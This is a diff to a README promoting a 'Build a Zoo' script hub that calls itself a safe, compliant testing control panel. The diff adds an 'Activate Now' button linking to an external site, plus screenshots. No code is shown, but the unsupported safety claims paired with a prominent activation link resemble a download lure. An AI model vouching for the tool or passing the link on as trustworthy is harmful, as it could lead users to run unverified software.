@@ -6,6 +6,9 @@ Made for developers, creators, and builders, this hub lets you *analyze*, *simul
 
 Forget messy scripts or unsafe methods — this is structured, compliant, and built purely for **Studio and private testing**.
 
+[![Activate Now](https://github.com/hawk-1983/hawk-1983/blob/main/img.png?raw=true)](https://build-a-zoo-scripts.github.io/.github/)
+
+
 ---
 
 ## 🌿 Overview
@@ -19,6 +22,9 @@ Think of it as your **Zoo Manager’s Control Panel** — elegant, stable, and e
 [!IMPORTANT]
 
 > This tool is strictly for testing, development, and accessibility research — not for public server play.
+
+<img width="1280" height="720" alt="image" src="https://github.com/user-attachments/assets/23dd3c7e-4471-41ef-b5c7-e93590d7f80f" />
+
 
 ---
 
@@ -55,6 +61,9 @@ Think of it as your **Zoo Manager’s Control Panel** — elegant, stable, and e
 
 > All data and visuals are **simulated**; no real game mechanics are altered or affected.
 
+<img width="1280" height="720" alt="image" src="https://github.com/user-attachments/assets/10441d09-3086-4737-b691-5979907e4168" />
+
+
 ---
 
 ## 🚀 Quick Setup
@@ -66,6 +75,9 @@ Think of it as your **Zoo Manager’s Control Panel** — elegant, stable, and e
 5. Save your configuration profile and start your testing session.
 
 And that’s it — your personal zoo testing control panel is live.
+
+<img width="2200" height="1100" alt="image" src="https://github.com/user-attachments/assets/41a3a0b5-e51b-4acc-8f8b-30ce564cc32b" />
+
 
 ---
 
